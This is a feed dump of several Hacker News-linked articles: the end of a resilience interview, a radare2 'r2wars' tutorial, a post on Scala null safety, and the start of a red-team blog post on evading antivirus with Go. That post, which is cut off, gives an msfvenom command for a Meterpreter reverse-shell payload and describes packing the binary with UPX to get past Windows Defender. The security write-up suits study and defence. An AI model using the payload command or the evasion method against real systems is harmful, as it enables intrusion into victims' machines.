And I think my "home" is in supporting people who are building new organizations. At the moment, that's venture-backed startups.<br></p><p><strong>Let's dive into a topic that is top of mind for most people, given the state of the world right now. What does resilience mean to you?</strong></p><p>I think we often treat resilience as an innate characteristic of people. But I believe that it's a skill that we use to recover from hardship through repeated attempts and self-management to keep ourselves going.<br></p><p><strong>So, how has your thinking about resilience changed in 2020?</strong></p><p>I've come to a realization this year that in the startup world, we love the myth of the heroic individual—and resilience is a part of that myth. It's something I've thought about a lot, but the current situation has confirmed it for me. While I believe in an individual creators' power, we often take the focus off the system that enables them to be resilient. And it takes the focus off the differences that make one person's resilience easier to practice than another.</p><p>There are many psychological reasons why that happens, including the fact that all successful people had to overcome some hardship. But that doesn't make their hardship equivalent to somebody else's. So in the aftermath of the protest surrounding George Floyd's murder and the changed circumstances with the pandemic, it reminded me that resilience is something that stems from having the opportunity to show you can be resilient.</p><p><strong>Resilience as a proxy for opportunity. Curious: when was the last time you checked-in with yourself?</strong></p><p>This morning. I try to have a scientist's attitude about it, which is to say hypotheses that you falsify.</p><p>If you're confident you're going in the right direction regardless of what the evidence says, you're probably not paying attention to the world. So I ask myself a lot, "how do I know if I'd be wrong?" And one of the places <a href="https://www.linkedin.com/in/roybahat/detail/recent-activity/posts/" rel="noopener" target="_self">I've written about that is on LinkedIn</a>. I try to write an <a href="https://also.roybahat.com/your-career-is-a-mess-a8a58acd18fa" rel="noopener" target="_self">honest accounting</a> of what I was thinking and what was right or wrong about different choices. Unless I can learn from them, I don't know where I'm going.</p><p><strong>Is there a time when you wish you were more resilient?</strong></p><p>It might just be because of this present moment, but I think I'm one of these people who tries to think of myself as a good person and do the right thing. And so I can be fragile when critiqued around bias, whether that's sexism or racism because it doesn't align with how I think about what I try to do. And so, I wish that I could've been more resilient in not dismissing that the first few times it came up in my life and try to learn from it.</p><p><strong>Related, what's one big mistake you made, and how did you bounce back from that?</strong></p><p>I should have proposed to my wife years before I did.</p><p>I used to think relationships should all be easy. I was mistaken. Any relationship worth having is one you should take seriously and keep working on it. I wrote a <a href="https://also.roybahat.com/what-our-kids-see-7dc650be8a90" rel="noopener" target="_self">blog post</a> a few years ago now about my son asking me to get off my phone. It stung. But my relationship with my son matters more to me than my ego, and when something I do hurts him, I want to pay attention and grow from it.<br></p><p><strong>In your view, how can people be more resilient in their work-life?</strong></p><p>We should think of resilience as a skill or a muscle. You see something you want to achieve and the obstacle to it and then get resourceful. I think the mistake is being in a situation where you weren't resilient, which leads to some inherent judgment about you as a person versus "you know I didn't hit that basket, I've got to try again."<br></p><p><strong>How does being vulnerable help in building a resilient team?</strong></p><p>The more I see the humanity in the people with whom I am working, the better I can work with them. I know where they're coming from, and I have empathy for them because of that. Somewhat connected to the hero myth—being resilient and being cold is not the same thing.</p><p><strong>Who is the most resilient person that you know, and why?</strong></p><p>Honestly, there are probably many I don't realize are resilient because they keep their struggles private. <a href="https://adeolonoh.com/page/2/" rel="noopener" target="_self">Ade Olonoh</a> wrote a recent <a href="https://www.formstack.com/blog/2020/why-we-should-talk-about-race-ade-olonoh/" rel="noopener" target="_self">piece about race issues</a> and how he struggled to talk about it. I've known the guy for years, and I didn't realize this was something he was going through. So, that makes me think about all the other people who are there who have a sort of silent resilience.</p><p>In terms of people I know, I'd say my wife. She had a much more difficult upbringing that I did economically, and the fact that she's the amazing person that she is, I think, is a sign of resilience. And my mom. My dad passed away when I was 12, and my mom persevered. My brother and I were never worried about things falling apart because she handled it. But again, are they the most resilient people I know? Maybe not. They're the people I know the most about their resilience.</p><p><strong>If you could give people one piece of advice about what's going on in the world right now, what would it be?</strong></p><p>Well, first, I have to say that I'm allergic to the idea of giving advice.</p><p>Someone once told me that all advice is autobiographical. Whether it's one person trying to get you to justify what they do to feel better about themselves or, worse, they're trying to live vicariously through you as an experiment for themselves. Either way, it's not in your interest. I do this <a href="https://twitter.com/search?q=%23thisisnotadvice&amp;src=typed_query&amp;f=live" rel="noopener" target="_self">daily series of tips about work on Twitter</a>, where I go deeper into this concept.</p><p>From my experience, I would say to look at what's happening in the world as a project. And not like a side project. You have to put it front and center for yourself and amp up your experimentation on what's working for you. If that means limiting the amount of news you consume to a few hours a day or eating healthier, taking a long bath, calling someone you love every day, fighting for social justice, etc. Treat yourself as the subject of your experiments. I made a list of 14 things that might work to help myself get through this time, and I think I had to do 12 of the 14 before I felt much better. And now I'm in a much clearer place, but it's still a work in progress.<br></p><p><strong>What are some books or resources you'd recommend on resilience, or that help with getting through tough times?</strong></p><p>Read more fiction. I think we tend to read these abstract advice books about grit and related topics, but for me, what keeps me going are the stories I experience in my own life and the stories I read. Of course, you should listen to the Brene Brown TED talk on vulnerability and shame—it's really good. But I would read stories written by authors who had to go through tough times to get to where they are.</p><p>The new one I've started is <a href="https://www.wsj.com/articles/nk-jemisin-city-became-book-coronavirus-11597764521" rel="noopener" target="_self">N. K. Jeminsin</a>, because I've never read any of her stuff before, and I've gotten a lot out of <a href="https://en.wikipedia.org/wiki/John_Irving" rel="noopener" target="_self">John Irving's books</a>—A Prayer for Owen Meany is one of my favorite novels. The sustenance for progress is examples, and we get those examples from a specific technology: stories.</p><p><a href="https://twitter.com/roybahat?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor" rel="noopener" target="_self"><img src="https://cdn.sanity.io/images/e422uarq/production/96577fbf0ed9b0619149cc5f5d8dc663554a299d-2316x2316.jpg?fm=jpg&amp;w=330&amp;dpr=2&amp;q=40" alt="Roy Bahat and family"></a></p><hr></div></div></section></div>]]>
            </description>
            <link>https://www.range.co/blog/talking-resilience-with-roy-bahat-of-bloomberg-beta</link>
            <guid isPermaLink="false">hacker-news-small-sites-24263090</guid>
            <pubDate>Mon, 24 Aug 2020 17:34:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[R2wars]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262901">thread link</a>) | @todsacerdoti
<br/>
August 24, 2020 | https://www.tildeho.me/r2wars/ | <a href="https://web.archive.org/web/*/https://www.tildeho.me/r2wars/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1567583789793-87f44f80ab61?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1567583789793-87f44f80ab61?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1567583789793-87f44f80ab61?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1567583789793-87f44f80ab61?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1567583789793-87f44f80ab61?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="r2wars">
            </figure>

            <section>
                <div>
                    <!--kg-card-begin: markdown--><h2 id="introduction">Introduction</h2>
<p>Over the last few days, I’ve played around with r2wars, a competion typically between two programs that try to survive as much time as possible in a shared memory space. A python implementation of r2wars can be found on <a href="https://github.com/radareorg/radare2-extras/tree/master/r2wars">github</a> as well as a <a href="https://github.com/radareorg/r2wars">C# Implementation</a>.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="whatisradare2">What is radare2?</h3>
<p>So let's start at the beginning with a question that might help some unfamiliar people understand all of this: what <a href="https://www.radare.org/">radare2</a> actually is. According to Wikipedia,</p>
<blockquote>
<p>"Radare2 is a complete framework for reverse-engineering and analyzing binaries; composed of a set of small utilities that can be used together or independently from the command line.<br>
— <a href="https://en.wikipedia.org/wiki/Radare2">Wikipedia - Radare2</a></p>
</blockquote>
<p>So we can use radare to take apart binaries, but using all the tools included, we can do much more as you'll see next.</p>
<blockquote>
<p>radare2 commands tend to be not so descriptive. If you don't know what a command does, you can append a question mark to the command to get some help. If you know what you want to do, but don't know the command that might be able to do what you want to do, you can use this alias to search through all radare commands interactively:<br>
<code>"alias r2help="r2 -qq -c '?*~...' --"</code></p>
</blockquote>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="whatisr2wars">What is r2wars?</h3>
<p>Over the last few days, I’ve played around with r2wars, a competion typically between two programs that try to survive as much time as possible in a shared memory space. A python implementation of r2wars can be found on github as well as a C# imple-mentation2.</p>
<p>There exist similar forms of games such as <a href="https://www.tildeho.me/r2wars/en.wikipedia.org/wiki/Core_War">Core Wars</a>, but what makes r2wars different is that the bots can be built in any architecture supported by ESIL (<a href="https://radare.gitbooks.io/radare2book/content/disassembling/esil.html%22">Evaluable Strings Intermediate Language</a>), more than 2 programs can run at the same time and cyclic execution cost matters for the turns.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="r2warsindetail">r2wars in detail</h2>
<p>So here we go, some more in detail information on how stuff works:</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="bots">Bots</h3>
<p>The "players" are bots. A bot is a piece of assembly, written in either x86, arm or mips using either 8, 16, 32, or 64 bit registers. A super simple bot doing nothing but locating itself in memory might look like this: (x86, 32 bits)</p>
<pre><code>call me
me:
    pop eax
</code></pre>
<p>Assembling such a bot can be done using rasm2, the radare2 assembler and disassembler tool, as displayed in the listing below.</p>
<pre><code>$ rasm2 -a x86 -b 32 -f bot.asm
e80000000058
</code></pre>
<p>The bot created can be inspected, by disassembling it again using rasm2 like below.</p>
<pre><code>$ rasm2 -D e80000000058
0x00000000   5      e800000000  call 5
0x00000005   1              58  pop eax
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="arena">Arena</h3>
<p>So now that you know how to assemble a bot, let's define the "arena" or the shared memory space in which the bots will battle.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h4 id="allocatingmemoryforthearena">Allocating memory for the Arena</h4>
<p>First of all, some memory should be allocated, for two bots, 1024 bytes should be enough. Memory can be allocated by radare as displayed below:</p>
<pre><code>$ r2 malloc://1024
 -- How about Global Thermonuclear War?
[0x00000000]&gt;
</code></pre>
<p>By doing this, we allocated 1024 bytes of memory. This is the shared space in which the bots will battle each other.</p>
<pre><code>[0x00000000]&gt; o
 3 * rwx 0x00000400 malloc://1024
</code></pre>
<p>As you can see, the memory allocated is mapped rwx and consists of 1024 (0x400) bytes.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h4 id="settingupthearenaandesil">Setting up the arena and ESIL</h4>
<p>The next step to building the arena is to define the architecture and the size of the registers that should be used:</p>
<pre><code>[0x00000000]&gt; e asm.arch = x86
[0x00000000]&gt; e asm.bits = 32
</code></pre>
<p>The next step is to initialize the ESIL VM state as well as the VM stack. All radare2 command for editing the ESIL VM are prefixed with <code>ae</code>.</p>
<pre><code>[0x00000000]&gt; aei 	# initialize ESIL VM state
[0x00000000]&gt; aeim 	# initialize ESIL VM stack&lt;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h4 id="generatinginitialpositionsforthebots">Generating initial positions for the bots</h4>
<p>The arena is now set up, the next step is to insert the bots into the arena. Selecting where to insert the bots is kind of crucial, because the bots should not be inserted into each other and not to close to the end of the arena (0x400 in this case).</p>
<p>In order to generate a random offsets where the bots can be placed, multiple addresses should be generated in the following way:</p>
<p>\(\text{genspace}=[0x000, 0x3c0)\)<br>
\(\text{maxbotspace}=[0x3c0, 0x400)\)</p>
<pre><code>0x000                        0x340              0x400
+ -------------------------- + -----------------+
|          gen space         |  max bot space   |
</code></pre>
<p>The space in which the bots should be generated is defined as "gen space". This means we can generate a random address in the range \([0, 0x340)\) in which we can (in theory) place the first bot.</p>
<p>After placing the first bot at, for example, (0x40), the address space in which the address for the second bot is chosen from is shrunk to \( [0x40+\texttt{maxbotsize}, 0x340] \) as displayed below.</p>
<pre><code>0x000      0x040             0x340              0x400
+ ---------+---------------- + -----------------+
| reserved |    gen space    |  max bot space   |
</code></pre>
<p>This might not work the first time, for example when using the default example of two bots in a 1024 bytes big memory space, each bot has (in theory) got 512 bytes of memory. Doing this for \( n \)~bots in \( x \)~bytes of memory results in \( \frac{n}{x} \) bytes per bot. This gets more problematic with a greater amount of bots in a limited memory space.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h4 id="insertingbotsintothearena">Inserting bots into the arena</h4>
<p>Inserting the bot into the arena is as easy as writing it's assembled code into the shared memory space. The command below writes the assembled bot to the memory location \(0x100\).</p>
<pre><code>[0x00000000]&gt; wx e80000000058 @ 0x100
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="rounds">Rounds</h3>
<p>r2wars is a round based game. This means that we need to store the state of each "player" (bot) each round, so that the others can execute their operation. When it's the players turn again, the state has to be restored, so that the player can continue execution as if nothing had happened. r2 can dump all ESIL registers using the <kbd>aer</kbd> command and can even print a command to set the registers, <kbd>aerR</kbd>.</p>
<pre><code>0x00000000]&gt; aerR
…
aer eax = 0x00000000
…
aer esp = 0x00000000
aer ebp = 0x00000000
aer eip = 0x00000000
…
</code></pre>
<p>By dumping these registers, we can easily restore the state of the bot, by replacing newline chars <kbd>\n</kbd> by semicolons <kbd>;</kbd> and executing the result with r2.</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="executinganinstruction">Executing an instruction</h3>
<p>After having created an "arena" and inserted a bot into the arena, we can execute an instruction, but before doing so, we still need to set up the"Progam Counter" (PC) and the "Stack Pointer" (SP) for the bot. We can do this by using the <kbd>aer</kbd> command, that can be used to manipulate<br>
the ESIR registers:</p>
<pre><code>[0x00000000]&gt; aer PC = 0x100
[0x00000000]&gt; aer SP=SP + 0x100
</code></pre>
<p>After having done this, the VM is setup and the instruction pointer (Program Counter in ESIL slang) is pointing to the first instruction of our bot. In order to step into, we can use the <kbd>aes</kbd> command:</p>
<pre><code>[0x00000000]&gt; aes
</code></pre>
<p>We haven't seen much of our bot yet, so let's look at what's happening. r2 can print the disassembly of the instructions at a specific offset using the <kbd>pd</kbd> command, so let's look at what is happening at the offset (0x100), that's where our bot is located.</p>
<pre><code>[0x00000105]&gt; pd 0x4 @ 0x100
0x00000100  e800000000  call 0x105
;-- eip:
0x00000105  58        pop eax
0x00000106  0000      add byte [eax], al
0x00000108  0000      add byte [eax], al
</code></pre>
<p>What we've done above is we've printed the \(0x4\) instructions at the offset \(0x100\). As you can see, the instruction at \(0x100\) contains a call to \(0x105\), the <kbd>pop eax</kbd> instruction. Radare also displays the current location of the Instruction Pointer (eip) that is<br>
currently pointing to \(0x105\).</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="actuallyplayingthegame">Actually playing the "game"</h2>
<p>Well, We're at the point at which you should have understood the basics, if not, DO NOT PANIC! You can read the "original" description <a href="https://github.com/radareorg/radare2-extras/tree/master/r2wars">here</a>.</p>
<p>If you have the desire to play around with this, you can clone my implementation from <a href="https://git.darknebu.la/r2wars/r2wars">here</a>. It is ready to go with two example bots that you can adjust to your needs.</p>
<p>So from here on, you're on your own. Good luck.</p>
<!--kg-card-end: markdown-->
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://www.tildeho.me/r2wars/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262901</guid>
            <pubDate>Mon, 24 Aug 2020 17:19:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Null-safety Part 1: The Problem]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262735">thread link</a>) | @ryan_stull
<br/>
August 24, 2020 | https://ryanstull.com/blog/2020/08/13/null-safety-part1.html | <a href="https://web.archive.org/web/*/https://ryanstull.com/blog/2020/08/13/null-safety-part1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
		<h2 id="the-problem">The Problem</h2>

<p>There are many different types of errors that programmers encounter frequently, which they must guard their programs against. Of those errors, few seem more pervasive than the infamous <code>NullPointerException</code> (NPE), or it’s equivalents. The cause of innumerable bugs and crashes, what programmer has not felt uneasy about the ever-present threat of this bug in their code?</p>

<figure>
	<iframe height="315" src="https://www.youtube.com/embed/bLHL75H_VEM" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="">
	</iframe>
	<figcaption>Who among us hasn't felt like the man in the yellow shirt?</figcaption>
</figure>

<p>Why is it the case though; that we must always be on the lookout for NPEs?  Since software is all about designing reusable abstractions to deal with the complexity of our code; <em>surely</em> this could be handled in a more rigorous and automated way than relying on the diligence of every programmer to check for NPEs in every line of code that they write.  There must be a way to solve this problem once and for all, no?</p>

<p>If you look online for explanations as to what causes an NPE, you’ll be met with a plethora of answers.  Some of which will give examples of code that will cause an NPE, and others which will simply state the conditions under which an NPE will occur, but few will address the fundamental reason why NPEs are so prevalent, let alone possible in the first place.</p>

<blockquote>
  <p>I call it my billion-dollar mistake. It was the invention of the null reference in 1965</p>

  <p>-Tony Hoare</p>
</blockquote>

<p>Null references made their first appearance AGOL W back in 1965, “simply because it was so easy to implement.”, as Tony Hoare recalls.  Since then, they’ve become an integral part of many, if not most, mainstream programming languages; however, as Hoare himself admits, the way in which they were implemented lead to the plethora of problems we now associate with NPEs.</p>

<h2 id="the-cause">The Cause</h2>

<p>The main reason why NPEs keep popping up is because of a deficiency in the type systems of the languages in which they appear (I’ll expand more on this in the conclusion) and the consequent decision to model <code>null</code> as the <strong>same type or a subtype</strong> of other values.  We’ll use Scala’s type system to study this problem.  (Note that all of the conclusions we’ll draw based on this will apply to Java as well, since <code>null</code> works the same in Java.)</p>

<figure>
	<img src="https://media.githubusercontent.com/media/ryanstull/ryanstull.github.io/master/images/posts/nullSafe/classhierarchy.png?raw=true" alt="The Scala type hierarchy">
	
	<figcaption>The Scala type hierarchy</figcaption>
</figure>

<p>This image describes the hierarchy of types within the Scala language.  As we can see from the image, <code>null</code> is a subtype of all reference types (<code>AnyRef</code> in Scala, <code>java.lang.Object</code> in Java).  This means that <code>null</code> can be used anywhere we’re expecting a reference.</p>

<p>This leads to some issues. Given two references as follows:</p>

<figure><pre><code data-lang="scala"><span>val</span> <span>a</span><span>:</span> <span>String</span> <span>=</span> <span>"hello"</span><span>;</span>

<span>val</span> <span>b</span><span>:</span> <span>String</span> <span>=</span> <span>null</span><span>;</span></code></pre></figure>

<p>We can’t tell just by looking at the type signatures which is <code>null</code> and which isn’t; so in a sense, the type system is telling us that these two objects can be used in the same way; but they cannot!</p>

<figure><pre><code data-lang="scala"><span>a</span><span>.</span><span>substring</span><span>(</span><span>2</span><span>);</span> <span>// "llo"</span>

<span>b</span><span>.</span><span>substring</span><span>(</span><span>2</span><span>);</span> <span>// throws NullPointerException</span></code></pre></figure>

<p>Since the whole purpose of static type systems is to understand what can and cannot be done to a certain value at compile time, we can see that conflating non-null and null references is a form of violating static type safety, even if the language doesn’t acknowledge it.</p>

<p>From this perspective, we see that an NPE is similar to the type of error one encounters when calling a method that doesn’t exist on an object in a dynamically typed language; though in the former case, this <em>should</em> be preventable by the type system.</p>

<figure><pre><code data-lang="javascript"><span>var</span> <span>string</span> <span>=</span> <span>'</span><span>Hello</span><span>'</span>

<span>string</span><span>.</span><span>abc</span><span>()</span> <span>// TypeError: s.abc is not a function</span></code></pre></figure>

<p>They’re both instances of calling a method which does not actually exist at runtime.</p>

<p>So this is the fundamental issue: <strong>Non-null and null references cannot be treated the same (i.e. have the same type), but many languages do treat them the same.</strong></p>

<h2 id="another-perspective">Another perspective</h2>

<p>Another way of looking at this, is through the lens of one of the <a href="https://en.wikipedia.org/wiki/SOLID">SOLID principles</a>, the <a href="https://en.wikipedia.org/wiki/Liskov_substitution_principle">Liskov Substitution Principle</a> (LSP).  The LSP is a rule which describes what properties a subtype must have in order to be a valid subtype. There are a few different ways to state the LSP, so I’ll include each of them for whichever makes the most sense to you.</p>

<p>Formally, the LSP states:</p>

<blockquote>
  <p>Let ϕ ( x ) be a property provable about objects x of type T. Then ϕ ( y ) should be true for objects y of type S where S is a subtype of T.</p>
</blockquote>

<p>In object oriented terms:</p>

<blockquote>
  <p>Functions that use pointers or references to base classes must be able to use objects of derived classes without knowing it.</p>
</blockquote>

<p>Yet another way (and perhaps my favorite):</p>

<blockquote>
  <p>A subtype must possess a superset of the properties of its supertype.</p>
</blockquote>

<p>So what the LSP is saying is, because in most languages subtypes can be used anywhere a supertype is expected, attempts to access properties defined in the supertype, must work on the subtype without error.</p>

<p>To use a classic example from OOP textbooks, let’s look at the relationship between a <code>Person</code> and an <code>Employee</code>.</p>

<figure><pre><code data-lang="scala"><span>class</span> <span>Person</span><span>(</span><span>name</span><span>:</span> <span>String</span><span>,</span> <span>age</span><span>:</span> <span>Int</span><span>)</span>

<span>class</span> <span>Employee</span><span>(</span><span>name</span><span>:</span> <span>String</span><span>,</span> <span>age</span><span>:</span> <span>Int</span><span>,</span> <span>company</span><span>:</span> <span>String</span><span>,</span> <span>salary</span><span>:</span> <span>Int</span><span>)</span>
 <span>extends</span> <span>Person</span><span>(</span><span>name</span><span>,</span> <span>age</span><span>)</span></code></pre></figure>

<p>Firstly, let’s look at the set diagram of these classes, for some <code>Person</code>s <code>P1</code> and <code>P2</code>, and <code>Employee</code>s <code>E1</code> and <code>E2</code>.</p>

<figure>
	<img src="https://media.githubusercontent.com/media/ryanstull/ryanstull.github.io/master/images/posts/nullSafe/members.png?raw=true" alt="Sets of the values">
	
	<figcaption>Sets of the values</figcaption>
</figure>

<p>Since <code>null</code> is supposedly a valid subtype of <code>Person</code> and <code>Employee</code>, it belongs inside of the <code>Employee</code> set; but now let’s look at a set diagram of the <em>properties</em> of <code>Person</code>, <code>Employee</code> and <code>null</code>.</p>

<figure>
	<img src="https://media.githubusercontent.com/media/ryanstull/ryanstull.github.io/master/images/posts/nullSafe/properties.png?raw=true" alt="Sets of the properties">
	
	<figcaption>Sets of the properties</figcaption>
</figure>

<p>Notice that substituting an <code>Employee</code> wherever the program is expecting a <code>Person</code> will work fine, since <code>Employee</code> has a superset of the properties of <code>Person</code>; but do you see the issue with <code>null</code>?  This is why <code>null</code> fundamentally should not be modeled as the same type or a subtype.  Having <code>null</code> be a subtype of all objects breaks the LSP because <code>null</code> does not possess <em>any</em> properties, let alone a superset of properties.  So, when we access a property of an object that is actually <code>null</code>, it doesn’t have that property; thus breaking the LSP and causing an NPE.</p>

<h2 id="the-solution">The Solution</h2>

<p>The solution to this problem is, conceptually, very straight forward;  the type system has to keep track of which references are possibly <code>null</code> and which are not.  If the type system knew which references were possibly <code>null</code>, then not checking if it were <code>null</code> before using it wouldn’t just be bad practice and an NPE at runtime, but would become an error at compile time; which is exactly what we want.</p>

<p>There are two ways that I know of that this can be implemented:</p>
<ul>
  <li>A generic wrapper type which would denote a nullable reference, something like C#’s <code>Nullable&lt;T&gt;</code>, Scala’s <code>Option[T]</code>, Rust’s <code>Option&lt;T&gt;</code>, or Kotlin’s <code>T?</code></li>
  <li>A type union of some type <code>T</code> with <code>Null</code>, which would look like <code>T | Null</code>.  Typescript can handle <code>null</code> this way with the <code>--strictNullChecks</code> flag, and this is also planned for a future version of Scala.</li>
</ul>

<p>Earlier I mentioned that <code>null</code> being modeled as a subtype of other types was due to a deficiency in the type systems of languages where <code>null</code> is modeled that way.  That deficiency is the lack of generics or union types.  Without either one of these mechanisms, you can’t create nullable versions of any existing type in the type system.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Modeling <code>null</code> as the same type or subtype of other types in the type system is the problem with the design of <code>null</code> in most languages.</p>

<h2 id="references">References:</h2>

<ul>
  <li><a href="https://www.infoq.com/presentations/Null-References-The-Billion-Dollar-Mistake-Tony-Hoare">https://www.infoq.com/presentations/Null-References-The-Billion-Dollar-Mistake-Tony-Hoare</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Tony_Hoare">https://en.wikipedia.org/wiki/Tony_Hoare</a></li>
  <li><a href="https://www.scala-lang.org/files/archive/spec/2.12/12-the-scala-standard-library.html">https://www.scala-lang.org/files/archive/spec/2.12/12-the-scala-standard-library.html</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Null_pointer">https://en.wikipedia.org/wiki/Null_pointer</a></li>
  <li><a href="https://stackoverflow.com/questions/218384/what-is-a-nullpointerexception-and-how-do-i-fix-it">https://stackoverflow.com/questions/218384/what-is-a-nullpointerexception-and-how-do-i-fix-it</a></li>
  <li><a href="https://en.wikipedia.org/wiki/Subtyping">https://en.wikipedia.org/wiki/Subtyping</a></li>
</ul>

<p>In the next part, we’ll examine the current strategies for dealing with null safety in Scala today, given the way <code>null</code> works.</p>

		<br>

		<hr>

		
	</div></div>]]>
            </description>
            <link>https://ryanstull.com/blog/2020/08/13/null-safety-part1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262735</guid>
            <pubDate>Mon, 24 Aug 2020 17:07:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PyWake an open source wind farm simulation tool]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262692">thread link</a>) | @carabiner
<br/>
August 24, 2020 | https://gitlab.windenergy.dtu.dk/TOPFARM/PyWake | <a href="https://web.archive.org/web/*/https://gitlab.windenergy.dtu.dk/TOPFARM/PyWake">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://gitlab.windenergy.dtu.dk/TOPFARM/PyWake</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262692</guid>
            <pubDate>Mon, 24 Aug 2020 17:03:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bypassing Antivirus with Golang – Gopher It]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262651">thread link</a>) | @aburan28
<br/>
August 24, 2020 | https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/ | <a href="https://web.archive.org/web/*/https://labs.jumpsec.com/2019/06/20/bypassing-antivirus-with-golang-gopher-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>
<section>
<article id="Post-324">

<p>Posted by warden on June 20th, 2019</p>
<div>

<p>In this blog post, we’re going to detail a cool little trick we came across on how to bypass most antivirus products to get a Metepreter reverse shell on a target host. This all started when we came across <a href="https://github.com/brimstone/go-shellcode">a Github repository written in Golang</a>, which on execution could inject shellcode into running processes. By simply generating a payload with msfvenom we tested it and found that it was easily detected by Windows Defender. The Meterpreter payload was generated as follows:</p>
<p>msfvenom -p windows/x64/meterpreter/reverse_tcp
LHOST=x.x.x.x LPORT=xxx -b \x00 -f hex</p>
<p>The perk of using Go for this experiment is that it can be
cross-compiled, from a Linux host for a target Windows host. The command to
compile the application was:</p>
<p>GOOS=windows GOARCH=amd64 go build</p>
<p>This would produce a Go exe which would be executed from the
command line, along with the shellcode the attacker wanted to inject. This was
easily detected, and Windows Defender identified it as Meterpreter without any
trouble. As a quick and easy bypass, we tried to compress the executable using
UPX in brute mode, which repeatedly compresses it 8 times. No luck here either,
as Windows Defender caught it again.</p>
<figure><img src="https://labs.jumpsec.com/wp-content/uploads/2019/06/fig1.png" alt="" width="904" height="319"></figure>
<p><em>Fig.1- Attempting
to run the Go exe file with the shellcode as an argument. As you can see it was
easily detected by Windows Defender. We then tried with the UPX compressed
sc.exe file, which also didn’t work.</em></p>
<figure><img src="https://labs.jumpsec.com/wp-content/uploads/2019/06/fig2.png" alt=""></figure>
<p><em>Fig.2 – Of course,
the Meterpreter session is killed as soon as the process is detected by Windows
Defender.</em></p>
<p>From here we inspected the source
code of the Go program. After some review, we discovered that the main.go
source file could be modified to take the shellcode as a variable then compiled
– instead of compiling the .exe then adding the shellcode as a command line
argument. </p>
<figure><img src="https://labs.jumpsec.com/wp-content/uploads/2019/06/fig3.png" alt=""></figure>
<p><em>Fig.3 – The
go-shellcode/cmd/sc/main.go source.</em></p>
<figure><img src="https://labs.jumpsec.com/wp-content/uploads/2019/06/fig4.png" alt=""></figure>
<p><em>Fig.4 – The
modified go-shellcode/cmd/sc/main.go source, where the reference to a command
line argument is substituted for a declared variable.</em></p>
<p>With these we compiled two .exe files, one to be tested
without UPX compression, and one with UPX compression. Windows Defender detects
the non-compressed version as soon as it touches disk, but does not detect the
UPX compressed .exe with static analysis.</p>
<figure><img src="https://labs.jumpsec.com/wp-content/uploads/2019/06/fig5.png" alt=""></figure>
<p><em>Fig.5 – The .exe with
no UPX compression is instantly detected as containing a Meterpreter payload by
Windows Defender. No dice.</em></p>
<p>Running the custom UPX compressed .exe file is successful
however, and a reverse shell is achieved! </p>
<figure><img src="https://labs.jumpsec.com/wp-content/uploads/2019/06/fig6.png" alt="" width="863" height="312"></figure>
<p><em>Fig.6 – Running
the UPX compressed Go exe file is successful, and a reverse shell is achieved
on the victim’s machine.</em></p>
<p>Fantastic. Let’s run it against VT to check how loud the
